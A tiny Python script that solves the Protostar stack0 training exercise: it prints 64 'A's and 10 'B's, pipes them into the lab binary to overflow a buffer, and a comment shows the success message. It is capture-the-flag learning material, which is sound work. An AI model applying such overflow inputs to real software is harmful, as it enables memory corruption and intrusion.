
#!/usr/bin/python

buffer = "A" * 64
overflow = "B" * 10
print buffer + overflow

"""
user@protostar:~$ python stack0.py | /opt/protostar/bin/stack0
you have changed the 'modified' variable
"""
